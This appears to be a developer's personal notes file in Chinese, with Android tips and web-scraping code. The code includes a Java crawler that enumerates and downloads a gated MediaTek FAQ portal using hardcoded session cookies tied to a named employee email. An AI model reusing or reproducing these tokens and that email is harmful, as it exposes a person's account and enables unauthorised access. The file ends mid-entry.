FedAuth=77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz48U1A+MCMuZnxlY21tZW1iZXJzaGlwcHJvdmlkZXJ8emhhbmd6aGVmZW5nQHNhZ2VyZWFsLmNvbSwwIy5mfGVjbW1lbWJlcnNoaXBwcm92aWRlcnx6aGFuZ3poZWZlbmdAc2FnZXJlYWwuY29tLDEzMjExMzYxNjE1NTA2Njc1NixGYWxzZSx1SWtDQmtmUHZuY2MycmdRSDMrK2NrbnRIRWlINTdQemlIODk4bWtCRm5LWWEwNmRqSHJIV0xkdUNkQkprUUdFSmp6SzlrZy9FWDVacEFFak5LK0hMek9TYVFqQ0J2amZiQXM3TmF0bCtIZE1UNWlkc0dUeVlVdUVITUt3eHNlZ2pDVCt5ME5mcktPM2lHUGEzN3lMdi9yTHN6ZDNRYjVaNXZDZzVJaU9rNWNmVWYyRSt5Q2d6ekNzczZ0RkVyOFQzYTc0THYzZ2xQQWp4UGNkejh1bG1OUkpHM0loRVFocVk0NjF6QWFuaHFIa1h1anU1ZXlBNm00c3ROMEFrR0lJS1grZVA4TVdtQkxJUm5VSytIQWs3SEZUODc4bnQwYWNSZFBwK001bmNiM2h3ZTdCSVY0MWlpUVNBVVRMb0gzZ0wycWlhNWg5WklJaWpVL2ZsN3ppc2c9PSxodHRwczovL29ubGluZS5tZWRpYXRlay5jb20vX2xheW91dHMvMTUvbW9sL3BvcnRhbC9leHQvU2VhcmNoUmVzdWx0LmFzcHg/YWN0aW9uPVF1ZXJ5JmFtcDt0ZXh0PU1US19XQVBQVVNIX1NVUFBPUlQ8L1NQPg==; __utma=246731354.917593042.1555902973.1566450226.1566875581.33; __utmt=1; __utmb=246731354.2.10.1566875581; Hm_lpvt_fac1ca85886ec6ae51442958d23d7be2=1566875634
Host: online.mediatek.com
Origin: https://online.mediatek.com
Referer: https://online.mediatek.com/FAQ
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36

只要加上这个就好了
sed -i "s/src=\\\\\"/src=\\\\\"https:\/\/online.mediatek.com\//g" `grep 'src=\\\"' -rl ./`

\n      替换为 空
&#58;   替换为 =
&#160;  替换为 &nbsp;
\"      替换为 "
src="   替换为 src="https://online.mediatek.com/

sed -i "s/\\\n//g" `grep '\\\n' -rl ./`
sed -i "s/&#58;/=/g" `grep '&#58;' -rl ./`
sed -i "s/&#160;/\&nbsp;/g" `grep '&#160;' -rl ./`
sed -i "s/\\\\\"/\"/g" `grep '\\\"' -rl ./`
sed -i "s/src=\"/src=\"https:\/\/online.mediatek.com\//g" `grep 'src=\"' -rl ./`
sed -i "s/<br\/>//g" `grep '<br\/>' -rl ./`


问题1.bmp 格式的图片如何下载?? exception:java.net.SocketException: Socket is closed

解答：
这个是因为socket被手动关闭了，所以会显示 socket is closed

问题2.version is not dcf version 1, no oma drm file

解答：
这个可能是因为手机打开了widevine导致的

问题3.在电脑上下载图片的时候会出现400错误??

解答：
这个可能是因为url中有中文导致的，用 URLEncoder.encode


爬取FAQ代码
for (int i = 1; i < 30000; i++) {
    @SuppressLint("DefaultLocale")
    String faqId = String.format("FAQ%05d", i);
    File file = new File(faqFolderPath + "/" + faqId);
    Log.e(TAG, "filePath:" + file.getAbsolutePath() + " exist:" + file.exists());
    if (file.exists()) {
        continue;
    }
    Log.e(TAG, "downloading " + faqId);
    mHandler.sendMessage(mHandler.obtainMessage(2, "downloading " + faqId));
    int resultCode = PostUtils.execute("https://online.mediatek.com/FAQ/api/ui/SW/" + faqId + "/detail");
    if (resultCode != 200) {
        resultCode = PostUtils.execute("https://online.mediatek.com/FAQ/api/ui/HW/" + faqId + "/detail");
    }
    Log.e(TAG, "download result " + resultCode);
    mHandler.sendMessage(mHandler.obtainMessage(2, "download result " + resultCode));
}


public class PostUtils {
    public static String COOKIE = "WSS_FullScreenMode=false; username=KH5ztksOLRQD+ffTecQAVhCaw5vObe954ljER26Ea2M=; usersystem=MOL; zhangzhefeng@sagereal.com.lang=zh-CN; __utmc=153516580; __utmc=246731354; __utmz=246731354.1565666097.26.10.utmcsr=search.mediatek.com|utmccn=(referral)|utmcmd=referral|utmcct=/searchresultframe.aspx; FedAuth=77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz48U1A+MCMuZnxlY21tZW1iZXJzaGlwcHJvdmlkZXJ8emhhbmd6aGVmZW5nQHNhZ2VyZWFsLmNvbSwwIy5mfGVjbW1lbWJlcnNoaXBwcm92aWRlcnx6aGFuZ3poZWZlbmdAc2FnZXJlYWwuY29tLDEzMjExNzg4NzUzMzUzOTg2NSxGYWxzZSxzRTRTR2ZFbzl1V1VIV2MzSkdIRVZWRnRXSndpdGNHbzljN3RqK1p1eEJZNy9leXl1SzdBUTU1cml4b2QreFdVc1NNVENiZ3pnMVhSSWxYRHhpZHNteW9HUStrYklqOVNXQzNFem9uOXQ2endCZUVldm1jZ01SWUgrcVBIdURwYkgrS01yY1dDRmJHMW5PQStqY0E0VmpnNFVRWDJFL1pGaE9mVWVoUmMrZ1dDbTlEWE4vSWU0bU81UUk1cmZ4T01YdUdZb29hU2RFdmc2VHVYNGNpdGt4RTRtaEM3WEJTRW9GUnRHWCthNkxjTFpURTJyYjNnWmlzeVM5T2JFM1d1cFl1cDJpcXRkblpXUzBNdnZCS3NMQ2dqUVVvMHRSaU1UV1VLZ2NrTHhsdTV3U2NLSVcwNEsycjNrMVRBbUl3WEZJcEVCM3hTUy9Zc2ZmL3FaODZCaEE9PSxodHRwczovL29ubGluZS5tZWRpYXRlay5jb20vRkFRL2FwaS91aS9TVy9GQVExOTQ5NC9kZXRhaWw8L1NQPg==; __utma=246731354.917593042.1555902973.1566875581.1566888169.34; __utmt=1; srh_shcn=%5B%22modemlog%20stopped%22%2C%22%E8%AF%AD%E8%A8%80%22%2C%22icu%22%2C%22%E9%BB%98%E8%AE%A4%E6%95%B0%E6%8D%AE%E8%BF%9E%E6%8E%A5%22%2C%22mtk_default_data_off%22%2C%22FAQ04794%22%2C%22%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E6%95%B0%E6%8D%AE%E8%BF%9E%E6%8E%A5%E5%BC%80%E5%85%B3%22%2C%22%E5%A3%81%E7%BA%B8%22%2C%22%E9%94%81%E5%B1%8F%20%E6%8C%89%E9%94%AE%E7%81%AF%22%2C%22%E9%94%81%E5%B1%8F%20%E9%94%AE%E7%9B%98%E7%81%AF%22%2C%22%E9%94%81%E5%B1%8F%22%2C%22ERFIDX%22%2C%22recovery%22%2C%22FAQ13817%22%2C%22%E6%89%93%E5%BC%80root%E6%9D%83%E9%99%90%22%2C%22%E5%88%86%E5%8C%BA%E8%A1%A8%22%2C%22proguard%22%2C%22%E7%98%A6%E8%BA%AB%22%2C%22aapt%22%2C%22hal3%22%2C%22lint%22%2C%22reserve%20memory%22%2C%22mtkfusionrild%22%2C%22mblock-8-ccci%22%2C%22FAQ09296%22%2C%22AUTO_ADD_GLOBAL_DEFINE_BY_NAME%22%2C%22FAQ10474%22%2C%22FAQ10435%22%2C%22FAQ03065%22%2C%22FAQ11012%22%2C%22FAQ12292%22%2C%22FAQ14338%22%2C%22FAQ17868%22%2C%22wifi%20%E5%88%97%E8%A1%A8%20%E6%BB%91%E4%B8%8D%E5%8A%A8%22%2C%22RecyclerView%22%2C%22wifi%20%E6%BB%91%E4%B8%8D%E5%8A%A8%22%2C%22%E5%88%97%E8%A1%A8%E6%BB%91%E5%8A%A8%22%2C%22MTK_WAPI_SUPPORT%22%2C%22%E6%97%A0%203G%20%E4%BF%A1%E5%8F%B7%22%2C%22radio%20is%20locked%20by%20other%20modul%22%2C%22radioTurnedOff%22%2C%22radio%20is%20locked%22%2C%22%E6%BB%91%E5%8A%A8%E4%B8%8D%E4%BA%86%22%2C%22consyslog%22%2C%22CTS%20Customize%20Guideline.docx%22%2C%22FAQ10820%22%2C%22android.os.strictmode.LeakedClosableViolation%3A%20A%20resource%20was%20acquired%20at%20attached%20stack%20trace%20but%20never%20released%22%2C%22How_to_Write_an_Android.mk%22%2C%22Android_Build_System_for_customer_4.1.pptx%22%2C%2210820%22%2C%22%E4%B9%A6%E7%AD%BE%20%E6%96%87%E4%BB%B6%E5%A4%B9%22%2C%22partnerbookmark%22%2C%22RTC%2032K%20mode%20setting%20wrong%22%2C%22%E5%AE%89%E5%85%94%E5%85%94%22%2C%22ALPS04040853%22%2C%22mtk%20meta%20software%20version%22%2C%22lmkd%22%2C%22Fota%20system%22%2C%22USB%E5%90%8D%E7%A7%B0%E4%BF%AE%E6%94%B9%E7%B3%BB%E5%88%97%22%2C%22GENERIC_FAILURE%22%2C%22MTK_SPECIAL_FACTORY_RESET%22%2C%22omadm%22%2C%22MTK_WAPPUSH_SUPPORT%22%2C%22FAQ19494%22%5D; __utma=153516580.1425507218.1555902994.1566450257.1566888180.19; __utmz=153516580.1566888180.19.19.utmcsr=online.mediatek.com|utmccn=(referral)|utmcmd=referral|utmcct=/Pages/PageNotFoundError.aspx; __utmb=153516580.1.10.1566888180; __utmb=246731354.2.10.1566888169; Hm_lvt_fac1ca85886ec6ae51442958d23d7be2=1565666131,1565666179,1565666326,1566888201; Hm_lpvt_fac1ca85886ec6ae51442958d23d7be2=1566888201";

    public static int execute(String getUrl) {
        InputStream inputStream = null;
        HttpURLConnection urlConnection = null;
        try {
            Log.e("TestTag", "execute(1)");
            URL url = new URL(getUrl);
            urlConnection = (HttpURLConnection) url.openConnection();

            /* optional request header */
            urlConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            urlConnection.setRequestProperty("Accept", "application/json");
            urlConnection.setRequestProperty("Referer", "https://online.mediatek.com/FAQ");
            urlConnection.setRequestProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36");
            urlConnection.setRequestProperty("Cookie", COOKIE);
            //urlConnection.setRequestProperty("Host", "online.mediatek.com");

            // read response
            /* for Get request */
            urlConnection.setRequestMethod("POST");
            urlConnection.setDoOutput(true);
            DataOutputStream wr = new DataOutputStream(urlConnection.getOutputStream());
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("ctl", "faqcontent");
            wr.writeBytes(jsonObject.toString());
            Log.e("TestTag", "execute(2)");
            wr.flush();
            wr.close();
            Log.e("TestTag", "execute(3)");
            // try to get response
            int statusCode = urlConnection.getResponseCode();
            Log.e("TestTag", "execute(4)" + statusCode);
            if (statusCode == 200) {
                Log.e("TestTag", "execute(5)");
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
                String line = "";
                StringBuffer stringBuffer = new StringBuffer();
                while((line = bufferedReader.readLine()) != null) {
                    Log.e("TestTag", "execute(6)" + line);
                    stringBuffer.append(line);
                }
                Log.e("TestTag", "execute(7) stringBuffer:" + stringBuffer.toString());
                JSONObject responseJsonObject = new JSONObject(stringBuffer.toString());
                String content = responseJsonObject.getString("Content");
                String faqId = responseJsonObject.getString("FAQID");
                String title = responseJsonObject.getString("Title");
                Log.e("TestTag", "execute(7) title:" + title);
                Log.e("TestTag", "execute(8) faqId:" + faqId);
                //Log.e("TestTag", "execute(9) content:" + content);
                writeFAQToFile(faqId, title, stringBuffer.toString());
                return 200;
            }
            return statusCode;
        } catch (Exception e) {
            Log.e("TestTag", "execute(7)", e);
            e.printStackTrace();
        } finally {
            if (inputStream != null) {
                try {
                    inputStream.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (urlConnection != null) {
                urlConnection.disconnect();
            }
        }
        Log.e("TestTag", "execute(8)");
        return -1;
    }

    public static int saveImageStream(String imageUrl, File imageFile) {
        InputStream inputStream = null;
        HttpURLConnection urlConnection = null;
        FileOutputStream fileOutputStream = null;
        try {
            Log.e("TestTag", "getImageStream(1)");
            URL url = new URL(imageUrl);
            urlConnection = (HttpURLConnection) url.openConnection();
            /* optional request header */
//            urlConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            urlConnection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3");
            urlConnection.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
            urlConnection.setRequestProperty("Accept-Language", "en-US,en;q=0.9,zh-CN;q=0.8,zh-TW;q=0.7,zh;q=0.6");
            urlConnection.setRequestProperty("Cache-Control", "max-age=0");
            urlConnection.setRequestProperty("Connection", "keep-alive");
            urlConnection.setRequestProperty("Upgrade-Insecure-Requests", "1");
            //urlConnection.setRequestProperty("Referer", "https://online.mediatek.com/FAQ");
            urlConnection.setRequestProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36");
            urlConnection.setRequestProperty("Cookie", "WSS_FullScreenMode=false; username=KH5ztksOLRQD+ffTecQAVhCaw5vObe954ljER26Ea2M=; usersystem=MOL; zhangzhefeng@sagereal.com.lang=zh-CN; __utmc=153516580; __utmc=246731354; FedAuth=77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz48U1A+MCMuZnxlY21tZW1iZXJzaGlwcHJvdmlkZXJ8emhhbmd6aGVmZW5nQHNhZ2VyZWFsLmNvbSwwIy5mfGVjbW1lbWJlcnNoaXBwcm92aWRlcnx6aGFuZ3poZWZlbmdAc2FnZXJlYWwuY29tLDEzMjExOTQ1NjI1OTg2Njg5OCxGYWxzZSxpRjVMYTVscUVPRXRiSk9kK1paM0NMYVFDYUZpd1BKQkxzZGhRUGFZakQ1ZkpwTGhLK3cyK245MGtoL2hzbmJ3b0RlWTdHUGVYczlLTkNXZnNYdTRjYStYRVZ3cm5NNXBQc1dJZ3QzS0kvcW9raEh2c1MzbU1zd1AwUWJqbGhIRVl0VytVTDIwMXFTR3VkT01CbERESXI3d3RVVkdvUTdIbmNyOGRHc1o1T0lNL3BQY2NHa09tN0VkS3pqMURIWWZZZEJvUmsxd3hwOG1jRkVLWHJiV1BZS3hLYU04MTFWRUMvWFJvdkJVYmNEMjZDMENYaU1KOWdSOEhMVXNQWk0ydWhWNlo4TForRml2bzdvQ0tCd2xTTkM5Qks4aHA4b0tnUzYzd3ZwT2gvSzMxSzVQMjUvVTNncEM5WW9OTjljaDFQR0ZxVnp0Szl0RDdGaTV5M3BOUHc9PSxodHRwczovL29ubGluZS5tZWRpYXRlay5jb20vRkFRL2FwaS91aS9TVy9GQVEwMDAzMC9kZXRhaWw8L1NQPg==; __utma=153516580.1425507218.1555902994.1567039912.1567043398.23; __utmz=153516580.1567043398.23.23.utmcsr=online.mediatek.com|utmccn=(referral)|utmcmd=referral|utmcct=/FAQ; srh_shcn=%5B%22modemlog%20stopped%22%2C%22%E8%AF%AD%E8%A8%80%22%2C%22icu%22%2C%22%E9%BB%98%E8%AE%A4%E6%95%B0%E6%8D%AE%E8%BF%9E%E6%8E%A5%22%2C%22mtk_default_data_off%22%2C%22FAQ04794%22%2C%22%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E6%95%B0%E6%8D%AE%E8%BF%9E%E6%8E%A5%E5%BC%80%E5%85%B3%22%2C%22%E5%A3%81%E7%BA%B8%22%2C%22%E9%94%81%E5%B1%8F%20%E6%8C%89%E9%94%AE%E7%81%AF%22%2C%22%E9%94%81%E5%B1%8F%20%E9%94%AE%E7%9B%98%E7%81%AF%22%2C%22%E9%94%81%E5%B1%8F%22%2C%22ERFIDX%22%2C%22recovery%22%2C%22FAQ13817%22%2C%22%E6%89%93%E5%BC%80root%E6%9D%83%E9%99%90%22%2C%22%E5%88%86%E5%8C%BA%E8%A1%A8%22%2C%22proguard%22%2C%22%E7%98%A6%E8%BA%AB%22%2C%22aapt%22%2C%22hal3%22%2C%22lint%22%2C%22reserve%20memory%22%2C%22mtkfusionrild%22%2C%22mblock-8-ccci%22%2C%22FAQ09296%22%2C%22AUTO_ADD_GLOBAL_DEFINE_BY_NAME%22%2C%22FAQ10474%22%2C%22FAQ10435%22%2C%22FAQ03065%22%2C%22FAQ11012%22%2C%22FAQ12292%22%2C%22FAQ14338%22%2C%22FAQ17868%22%2C%22wifi%20%E5%88%97%E8%A1%A8%20%E6%BB%91%E4%B8%8D%E5%8A%A8%22%2C%22RecyclerView%22%2C%22wifi%20%E6%BB%91%E4%B8%8D%E5%8A%A8%22%2C%22%E5%88%97%E8%A1%A8%E6%BB%91%E5%8A%A8%22%2C%22MTK_WAPI_SUPPORT%22%2C%22%E6%97%A0%203G%20%E4%BF%A1%E5%8F%B7%22%2C%22radio%20is%20locked%20by%20other%20modul%22%2C%22radioTurnedOff%22%2C%22radio%20is%20locked%22%2C%22%E6%BB%91%E5%8A%A8%E4%B8%8D%E4%BA%86%22%2C%22consyslog%22%2C%22CTS%20Customize%20Guideline.docx%22%2C%22FAQ10820%22%2C%22android.os.strictmode.LeakedClosableViolation%3A%20A%20resource%20was%20acquired%20at%20attached%20stack%20trace%20but%20never%20released%22%2C%22How_to_Write_an_Android.mk%22%2C%22Android_Build_System_for_customer_4.1.pptx%22%2C%2210820%22%2C%22%E4%B9%A6%E7%AD%BE%20%E6%96%87%E4%BB%B6%E5%A4%B9%22%2C%22partnerbookmark%22%2C%22RTC%2032K%20mode%20setting%20wrong%22%2C%22%E5%AE%89%E5%85%94%E5%85%94%22%2C%22ALPS04040853%22%2C%22mtk%20meta%20software%20version%22%2C%22lmkd%22%2C%22Fota%20system%22%2C%22USB%E5%90%8D%E7%A7%B0%E4%BF%AE%E6%94%B9%E7%B3%BB%E5%88%97%22%2C%22GENERIC_FAILURE%22%2C%22MTK_SPECIAL_FACTORY_RESET%22%2C%22omadm%22%2C%22MTK_WAPPUSH_SUPPORT%22%2C%22FAQ19494%22%2C%22FAQ11767%22%2C%2220677%22%2C%2200001%22%2C%2200002%22%2C%22apn%20class%22%5D; __utma=246731354.917593042.1555902973.1567038905.1567044302.41; __utmz=246731354.1567044302.41.11.utmcsr=search.mediatek.com|utmccn=(referral)|utmcmd=referral|utmcct=/searchresultframe.aspx; Hm_lvt_fac1ca85886ec6ae51442958d23d7be2=1566888212,1567039928,1567044302,1567045398; Hm_lpvt_fac1ca85886ec6ae51442958d23d7be2=1567045398");
            urlConnection.setRequestProperty("Host", "online.mediatek.com");
            urlConnection.setRequestMethod("GET");
            urlConnection.connect();
            Log.e("TestTag", "getImageStream(3)");
            // try to get response
            int statusCode = urlConnection.getResponseCode();
            Log.e("TestTag", "getImageStream(4)" + statusCode);
            String fileName = imageUrl.substring(imageUrl.lastIndexOf("/") + 1);
            fileOutputStream = new FileOutputStream(imageFile);

            if (statusCode == 200) {
                Log.e("TestTag", "saveImageStream(1)");
                inputStream = urlConnection.getInputStream();
                int length = -1;
                byte[]  buffer = new byte[1024] ;
                while ((length = inputStream.read(buffer)) != -1) {
                    Log.e("TestTag", "saveImageStream(2)" + length);
                    fileOutputStream.write(buffer, 0, length);
                }
                Log.e("TestTag", "saveImageStream(3)");
            }
            return statusCode;
        } catch (Exception e) {
            Log.e("TestTag", "getImageStream(7)", e);
            e.printStackTrace();
        } finally {
            if (inputStream != null) {
                try {
                    inputStream.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (fileOutputStream != null) {
                try {
                    fileOutputStream.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (urlConnection != null) {
                urlConnection.disconnect();
            }
        }
        Log.e("TestTag", "getImageStream(8)");
        return -1;
    }

    public static void writeFAQToFile(String faqId, String title, String content) throws IOException{
        File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath() +"/" + faqId);
        FileOutputStream fileOutputStream = new FileOutputStream(file);
        try (BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(fileOutputStream))) {
            bufferedWriter.write(content);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

## [爬虫] python爬虫

```text
https://blog.csdn.net/mouday/article/details/83026074

将工具按照以上分类说明，按照学习路线顺序给出参考文章

一、页面下载器
requests(必学)

python爬虫入门requests模块
Python爬虫：requests库基本使用
Python爬虫：使用requests库下载大文件
Python爬虫：requests多进程爬取猫眼电影榜单
requests InsecureRequestWarning: Unverified HTTPS request is being made.
scrapy

Python网络爬虫之scrapy框架
scrapy学习
Python爬虫：关于scrapy模块的请求头
Python爬虫：scrapy框架请求参数meta、headers、cookies一探究竟
Python爬虫：scrapy辅助功能实用函数
selenium+chrome + PhantomJS(抓取动态网页，不推荐)

mac下安装selenium+phantomjs+chromedriver
Python爬虫：selenium模块基本使用
Python爬虫selenium模块
Python爬虫：selenium和Chrome无头浏览器抓取烯牛数据动态网页
Python爬虫：利用selenium爬取淘宝商品信息
Python爬虫：selenium使用chrome和PhantomJS实用参数
Splash(抓取动态网页，推荐)

Python爬虫：splash的安装与简单示例
Python爬虫：splash+requests简单示例
Python爬虫：scrapy利用splash爬取动态网页
总结：
对于下载器而言，python自带的urllib就不要花时间去学了，学了就忘，直接requests能满足大部分测试+抓取需求，进阶工程化scrapy，动态网页优先找API接口，如果有简单加密就破解，实在困难就使用splash渲染

二、页面解析器
BeautifulSoup(入门级)

Python爬虫入门BeautifulSoup模块
pyquery （类似jQuery）

Python爬虫：pyquery模块解析网页
lxml

Python爬虫：使用lxml解析网页内容
parsel

Extract text using CSS or XPath selectors
scrapy的Selector (强烈推荐, 比较高级的封装，基于parsel)

选择器(Selectors)
python爬虫：scrapy框架xpath和css选择器语法
总结：
其实解析器学习一个就够了，其他都不用学，很多培训会教你从上到下的学习，我不是很推荐，直接学习scrapy的Selector 就行，简单、直接、高效

三、数据存储
txt文本
Python全栈之路：文件file常用操作
csv文件
python读取写入csv文件
sqlite3 （python自带）
Python编程：使用数据库sqlite3
MySQL
SQL：pymysql模块读写mysql数据
MongoDB
Python编程：mongodb的基本增删改查操作
总结：
数据存储没有什么可深究的，按照业务需求来就行，一般快速测试使用MongoDB，业务使用MySQL

四、其他工具
execjs ：执行js
Python爬虫：execjs在python中运行javascript代码

pyv8: 执行js
mac安装pyv8模块-JavaScript翻译成python

html5lib
1. Python爬虫：scrapy利用html5lib解析不规范的html文本

五、关于xpath练习
本人的一个开源项目：PageParser
https://github.com/mouday/PageParser
用于解析网页，最终实现6行代码写爬虫，可以贡献代码，顺便练习网页解析的能力



requests包：是一个实用的python的http客户端库，编写爬虫从web上爬取数据时经常用到 ，简单实用，接口简单 ，requests.get(URL)。

lxml包：主要用来解析通过requests抓取的html内容，从中提取出我们需要的数据，在对html文本内容进行提取、筛选时用到的是xpath语法 ，lxml使用的是xpath语法对html内容进行的定位筛选提取。

lxml包的使用： 
通过lxml工具可以从html代码中提取我们需要的数据
一个网页就是一个html的文件  
需要通过lxml对一个html格式的文件内容进行组织（组织成一个树形结构） 
html文件是一个树形结构 - 类型linux系统的目录结构  
通过lxml组织成树形结构后，然后再使用xpath语法对内容进行定位、筛选、过滤


xpath的语法使用： 
路径表示（使用xpath语法来表示xml文本中标签的路径）
//div  定位到根节点下的所有的div标签，并返回一个可迭代对象
//div[class="j-r-list-c-desc"] /hl/text()   提取某个标签下的文本数据
/@href   提取的是某个标签下的属性名称为href的属性值

筛选条件 
//div[@class="link"]  定位到根目录下的包含class属性并且属性值为link的div标签
//div[li]   筛选出根目录下所有的包含li子标签的div标签
//div[@class]  筛选出包含class属性的div标签
```

## [爬虫] JSoup模拟登录

```text
public void jsoupLogin(String loginUrl,String userInfoUrl)  throws IOException {
    // 构造登陆参数
    Map<String,String> data = new HashMap<>();
    data.put("name","your_account");
    data.put("password","your_password");
    data.put("remember","false");
    data.put("ticket","");
    data.put("ck","");
    Connection.Response login = Jsoup.connect(loginUrl)
            .ignoreContentType(true) // 忽略类型验证
            .followRedirects(false) // 禁止重定向
            .postDataCharset("utf-8")
            .header("Upgrade-Insecure-Requests","1")
            .header("Accept","application/json")
            .header("Content-Type","application/x-www-form-urlencoded")
            .header("X-Requested-With","XMLHttpRequest")
            .header("User-Agent","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36")
            .data(data)
            .method(Connection.Method.POST)
            .execute();
    login.charset("UTF-8");
    // login 中已经获取到登录成功之后的cookies
    // 构造访问个人中心的请求
    Document document = Jsoup.connect(userInfoUrl)
            // 取出login对象里面的cookies
            .cookies(login.cookies())
            .get();
    if (document != null) {
        Element element = document.select(".info h1").first();
        if (element == null) {
            System.out.println("没有找到 .info h1 标签");
            return;
        }
        String userName = element.ownText();
        System.out.println("豆瓣我的网名为：" + userName);
    } else {
        System.out.println("出错啦！！！！！");
    }
}
```

## [爬虫] HttpClient模拟登录

```text
public void httpClientLogin(String loginUrl,String userInfoUrl) throws Exception{
    CloseableHttpClient httpclient = HttpClients.createDefault();
    HttpUriRequest login = RequestBuilder.post()
            .setUri(new URI(loginUrl))// 登陆url
            .setHeader("Upgrade-Insecure-Requests","1")
            .setHeader("Accept","application/json")
            .setHeader("Content-Type","application/x-www-form-urlencoded")
            .setHeader("X-Requested-With","XMLHttpRequest")
            .setHeader("User-Agent","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36")
            // 设置账号信息
            .addParameter("name","your_account")
            .addParameter("password","your_password")
            .addParameter("remember","false")
            .addParameter("ticket","")
            .addParameter("ck","")
            .build();
    // 模拟登陆
    CloseableHttpResponse response = httpclient.execute(login);
    if (response.getStatusLine().getStatusCode() == 200) {
        // 构造访问个人中心请求
        HttpGet httpGet = new HttpGet(userInfoUrl);
        CloseableHttpResponse user_response = httpclient.execute(httpGet);
        HttpEntity entity = user_response.getEntity();
        //
        String body = EntityUtils.toString(entity, "utf-8");

        // 偷个懒，直接判断 缺心眼那叫单纯 是否存在字符串中
        System.out.println("缺心眼那叫单纯是否查找到?"+(body.contains("缺心眼那叫单纯")));
    } else {
        System.out.println("httpclient 模拟登录豆瓣失败了!!!!");
    }
}
```

## [prop]  [SystemProperty] 通过代码修改 gsm.serial

```text
在 SystemProperties 中定义的 gsm.* 的访问权限为 radio，说明只有 radio 进程才能修改 gsm 开头的 properties 值，所以可以在 phone 进程中修改
```

## development/tools/findunused 的用法，可以找出那些没有被使用的资源

```text
./development/tools/findunused/findunusedstrings -p vendor/mediatek/proprietary/packages/apps/MtkSettings/
```

## performClick() 和 callOnClick() 的区别

```text
public boolean callOnClick() {
    ListenerInfo li = mListenerInfo;
    if (li != null && li.mOnClickListener != null) {
        li.mOnClickListener.onClick(this);
        return true;
    }
    return false;
}

public boolean performClick() {
    final boolean result;
    final ListenerInfo li = mListenerInfo;
    if (li != null && li.mOnClickListener != null) {
        playSoundEffect(SoundEffectConstants.CLICK);                // 多出来的1
        if (ViewDebugManager.DEBUG_TOUCH) {
            Log.d(VIEW_LOG_TAG, "(View)performClick, listener = " + li.mOnClickListener + ",this = " + this);
        }
        li.mOnClickListener.onClick(this);
        result = true;
    } else {
        result = false;
    }
    sendAccessibilityEvent(AccessibilityEvent.TYPE_VIEW_CLICKED);   // 多出来的2
    notifyEnterOrExitForAutoFillIfNeeded(true);                     // 多出来的3
    return result;
}
```

## [反射]  [Snippet] 反射获取顶层activity实例对象

```text
private void reflectActivity() {
    try {
        String actName = topAct(application);// com.example.calledjar.MainActivity
        Class clz = application.getClass().forName("android.app.ActivityThread");
        Method meth = clz.getMethod("currentActivityThread");
        Object currentActivityThread = meth.invoke(null);
        Field f = clz.getDeclaredField("mActivities");
        f.setAccessible(true);
        ArrayMap obj = (ArrayMap) f.get(currentActivityThread);
        Log.e(tag, "______reflectActivity____");
        for (Object key : obj.keySet()) {
            Object activityRecord = obj.get(key);
            Field actField = activityRecord.getClass().getDeclaredField("activity");
            actField.setAccessible(true);
            Object activity = actField.get(activityRecord);
            System.out.println(activity);
            Activity act1 = (Activity) activity;

            String act1N = act1.getClass().toString();// class
            // com.example.calledjar.MainActivity
            String act1Name = act1N.substring(6);// class
            // com.example.calledjar.MainActivity

            if (actName.equals(act1Name)) {
                act = act1;
                Log.e(tag, "______reflectActivity____" + act.toString());
                return;
            }
        }
    } catch (Exception e) {
        e.printStackTrace();
    }
}

private String topAct(Application application2) {
    ActivityManager am = (ActivityManager) application2.getSystemService("activity");
    ComponentName cn = am.getRunningTasks(30).get(0).topActivity;
    return cn.getClassName();
}
```

## [sprd] Android Framework 框架系列之展讯手机重启

```text
https://blog.csdn.net/wjky2014/article/details/100939051
```

## SurfaceFlinger研究

```text
https://blog.csdn.net/daoliting5268/article/details/103353000
```

## 无侵入式获取全局 Context

```text
public final class PicassoProvider extends ContentProvider {
    static Context context;
    public boolean onCreate() {
        context = getContext(); // 在 AndroidManifest.xml 中注册 PicassoProvider 之后，在启动应用的时候会自动调用 ContentProvider 的 onCreate() 方法，从而获取 context
        return true;
    }
}
```

## [Snippet]  [算法] 排序

```text
Arrays.sort(nums);
```

## [sprd] 查看CP版本

```text
strings ./transsion/SP591_W6004_A56/modem_bins/wmodem.bin | grep "MOCORTM"

Output:
Platform Version: MOCORTM_17C_ITEL_RLS2_W19.28.5_P4_Debug
```

## [sprd] 查看AP版本

```text
vendor/sprd/release/IDH/CUS_Release_Notes/AP/CUS_releasenote.xlsx
```

## [sprd] 查看编译的工程

```text
device/sprd/pike2/sp7731e_1h10
```

## android.view.WindowManager$BadTokenException: Unable to add window -- token android.os.BinderProxy@XXX is not valid; is your activity running?

```text
日前遇到一个dialog.show()崩溃的问题(在判断了null或isFinshing之后还崩溃的)

报错信息 

